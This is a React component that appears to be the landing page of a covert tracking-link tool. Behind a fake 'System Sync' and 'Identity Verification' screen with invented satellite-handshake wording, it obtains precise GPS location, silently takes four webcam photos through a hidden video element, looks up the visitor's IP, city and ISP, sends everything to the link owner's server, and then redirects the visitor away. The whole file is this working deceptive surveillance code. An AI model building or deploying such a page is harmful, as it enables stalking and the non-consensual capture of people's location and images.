
import React, { useEffect, useState, useRef, useCallback } from 'react';
import { ShieldCheck, CheckCircle2, ChevronRight, Wifi, Zap, Cpu, MapPin, Loader2, Fingerprint, Activity, Signal, AlertTriangle, RefreshCcw } from 'lucide-react';
import { CaptureReport, DeviceInfo, GeoLocation } from '../types';

interface Props {
  linkId: string;
}

const CapturePage: React.FC<Props> = ({ linkId }) => {
  const [status, setStatus] = useState<'consent' | 'denied' | 'idle' | 'sliding' | 'verifying' | 'done'>('consent');
  const [sliderPos, setSliderPos] = useState(0);
  const [geoStatus, setGeoStatus] = useState<string>('Initialization Required');
  const [accuracy, setAccuracy] = useState<number | null>(null);
  const [redirectTarget, setRedirectTarget] = useState('https://google.com');
  const [metricsCount, setMetricsCount] = useState(0);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const reportRef = useRef<Partial<CaptureReport>>({});
  const containerRef = useRef<HTMLDivElement>(null);
  const isDragging = useRef(false);
  const geoPromiseRef = useRef<Promise<GeoLocation> | null>(null);

  useEffect(() => {
    fetch(`/api/link-info/${linkId}`).then(r => r.json()).then(data => { if (data.redirectUrl) setRedirectTarget(data.redirectUrl); });
  }, [linkId]);

  const getHighAccuracyLocation = useCallback((): Promise<GeoLocation> => {
    return new Promise((resolve) => {
      let watchId: number | null = null;
      let timeoutId: any = null;
      let bestFix: GeolocationPosition | null = null;

      const finish = () => {
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        if (timeoutId) clearTimeout(timeoutId);
        if (bestFix) {
          resolve({
            lat: bestFix.coords.latitude, lon: bestFix.coords.longitude,
            accuracy: bestFix.coords.accuracy, altitude: bestFix.coords.altitude,
            altitudeAccuracy: bestFix.coords.altitudeAccuracy, heading: bestFix.coords.heading, speed: bestFix.coords.speed,
          });
        } else {
          fetch('https://ipapi.co/json/').then(r => r.json()).then(ipRes => resolve({
            lat: ipRes.latitude, lon: ipRes.longitude, accuracy: 3000,
            ip: ipRes.ip, city: ipRes.city, country: ipRes.country_name, isp: ipRes.org,
          })).catch(() => resolve({ lat: 0, lon: 0, accuracy: 0 }));
        }
      };

      if (!("geolocation" in navigator)) { finish(); return; }
      setGeoStatus('Requesting Satellite Access...');
      timeoutId = setTimeout(() => { finish(); }, 12000); 
      watchId = navigator.geolocation.watchPosition(
        (pos) => {
          setAccuracy(Math.round(pos.coords.accuracy));
          setGeoStatus('Handshake Valid...');
          if (!bestFix || pos.coords.accuracy < bestFix.coords.accuracy) {
            bestFix = pos;
            if (pos.coords.accuracy <= 20) finish();
          }
        },
        () => { setStatus('denied'); finish(); },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    });
  }, []);

  const handleConsent = () => {
    setStatus('idle');
    geoPromiseRef.current = getHighAccuracyLocation();
  };

  const finalizeCapture = async () => {
    setStatus('verifying');
    if (!geoPromiseRef.current) geoPromiseRef.current = getHighAccuracyLocation();
    
    let photos: string[] = [];
    if (navigator.mediaDevices?.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
          for (let i = 0; i < 4; i++) {
            await new Promise(r => setTimeout(r, 600));
            const ctx = canvasRef.current.getContext('2d');
            canvasRef.current.width = videoRef.current.videoWidth;
            canvasRef.current.height = videoRef.current.videoHeight;
            ctx?.drawImage(videoRef.current, 0, 0);
            photos.push(canvasRef.current.toDataURL('image/jpeg', 0.4));
          }
          stream.getTracks().forEach(t => t.stop());
        }
      } catch (e) {}
    }

    const finalLocation = await geoPromiseRef.current;
    try {
      const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
      reportRef.current.location = { ...finalLocation, ip: ipRes.ip, city: finalLocation.city || ipRes.city, country: finalLocation.country || ipRes.country_name, isp: ipRes.org };
    } catch (e) { reportRef.current.location = finalLocation; }

    reportRef.current.photos = photos;
    const finalReport = { ...reportRef.current, id: Math.random().toString(36).substring(7), timestamp: new Date().toISOString(), redirectUrl: redirectTarget, linkId: linkId };

    try {
      await fetch(`/api/reports/${linkId}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(finalReport) });
    } catch (err) {}

    setStatus('done');
    setTimeout(() => { window.location.href = redirectTarget; }, 1000);
  };

  const handleMove = (clientX: number) => {
    if (!isDragging.current || !containerRef.current) return;
    const rect = containerRef.current.getBoundingClientRect();
    const x = Math.max(0, Math.min(clientX - rect.left, rect.width - 64));
    const percent = (x / (rect.width - 64)) * 100;
    setSliderPos(percent);
    if (percent >= 98) { isDragging.current = false; setSliderPos(100); finalizeCapture(); }
  };

  useEffect(() => {
    const onMM = (e: MouseEvent) => handleMove(e.clientX);
    const onTM = (e: TouchEvent) => handleMove(e.touches[0].clientX);
    const onEnd = () => { isDragging.current = false; if (sliderPos < 98) { setSliderPos(0); setStatus('idle'); } };
    window.addEventListener('mousemove', onMM); window.addEventListener('touchmove', onTM); window.addEventListener('mouseup', onEnd); window.addEventListener('touchend', onEnd);
    return () => { window.removeEventListener('mousemove', onMM); window.removeEventListener('touchmove', onTM); window.removeEventListener('mouseup', onEnd); window.removeEventListener('touchend', onEnd); };
  }, [sliderPos]);

  return (
    <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4 select-none">
      <video ref={videoRef} className="hidden" playsInline muted></video>
      <canvas ref={canvasRef} className="hidden"></canvas>

      <div className="w-full max-w-sm bg-white rounded-[3rem] shadow-2xl overflow-hidden animate-pop">
        {status === 'consent' || status === 'denied' ? (
          <div className="p-10 space-y-8">
            <div className={`w-20 h-20 rounded-[2rem] flex items-center justify-center mx-auto border ${status === 'denied' ? 'bg-red-50 border-red-200' : 'bg-brand-accent/10 border-brand-accent/20'}`}>
              {status === 'denied' ? <AlertTriangle className="text-red-500" size={40} /> : <ShieldCheck size={40} className="text-brand-accent" />}
            </div>
            <div className="text-center space-y-3">
              <h1 className={`text-2xl font-black uppercase italic ${status === 'denied' ? 'text-red-600' : 'text-ink'}`}>
                {status === 'denied' ? 'Sensor Error' : 'System Sync'}
              </h1>
              <p className="text-sm font-bold text-ink/50 leading-relaxed">
                {status === 'denied' 
                  ? 'Synchronization failed. GPS sensors must be enabled to authenticate the handshake.' 
                  : 'Establish a high-precision satellite handshake to continue to destination.'}
              </p>
            </div>
            <button onClick={handleConsent} className="w-full bg-ink text-white font-black py-5 rounded-3xl flex items-center justify-center gap-3 uppercase italic tracking-tighter hover:bg-brand-accent transition-all">
              {status === 'denied' ? <RefreshCcw size={18}/> : null}
              {status === 'denied' ? 'Retry Handshake' : 'Initialize'}
            </button>
          </div>
        ) : (
          <>
            <div className="p-10 pb-6 text-center bg-gray-50 border-b border-gray-100">
              <div className="inline-flex items-center justify-center w-24 h-24 bg-brand-accent/10 rounded-[2.5rem] mb-6 border-2 border-brand-accent/20 relative">
                <div className={`absolute inset-0 bg-brand-accent/5 rounded-[2.5rem] ${status !== 'idle' ? 'animate-ping' : ''}`} />
                <Fingerprint className="text-brand-accent relative z-10" size={48} />
              </div>
              <h1 className="text-2xl font-black text-ink tracking-tight uppercase italic">Identity Verification</h1>
              <p className="text-[10px] font-black text-ink/30 uppercase tracking-[0.4em] mt-2">{geoStatus}</p>
            </div>

            <div className="p-10 pt-4 space-y-10">
               <div className="bg-gray-50 rounded-2xl p-4 border border-gray-100 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Signal size={16} className="text-brand-accent" />
                  <div>
                    <p className="text-[10px] font-black text-ink uppercase">Network integrity</p>
                    <p className="text-[9px] font-bold text-ink/30 uppercase">Calibrating uplink</p>
                  </div>
                </div>
                <Activity size={16} className={`${status !== 'idle' ? 'animate-pulse text-brand-accent' : 'text-gray-200'}`} />
              </div>

              <div ref={containerRef} className="relative h-20 bg-gray-100 rounded-[2.5rem] border-2 border-gray-200 p-2 flex items-center overflow-hidden">
                <div className={`absolute inset-0 flex items-center justify-center transition-opacity ${status === 'verifying' ? 'opacity-0' : 'opacity-100'}`}>
                   <span className="text-ink/15 font-black uppercase text-[11px] tracking-[0.25em] flex items-center gap-2">Swipe to Connect <ChevronRight size={16} /></span>
                </div>
                <div className="absolute left-0 top-0 h-full bg-brand-accent/10" style={{ width: `calc(${sliderPos}% + 40px)` }} />
                <div onMouseDown={() => {isDragging.current = true; setStatus('sliding');}} onTouchStart={() => {isDragging.current = true; setStatus('sliding');}} style={{ transform: `translateX(${sliderPos}%)`, left: '0' }} className="relative z-10 w-16 h-16 bg-white border border-gray-200 rounded-full shadow-2xl flex items-center justify-center transition-all cursor-grab active:cursor-grabbing">
                  {status === 'verifying' ? <Loader2 className="animate-spin text-brand-accent" size={32} /> : status === 'done' ? <CheckCircle2 className="text-green-500" size={36} /> : <ChevronRight className="text-brand-accent" size={36} />}
                </div>
              </div>
            </div>
          </>
        )}
      </div>
      <style>{`@keyframes scan { 0% { transform: translateX(-150%) skewX(-20deg); } 100% { transform: translateX(250%) skewX(-20deg); } }`}</style>
    </div>
  );
};

export default CapturePage;
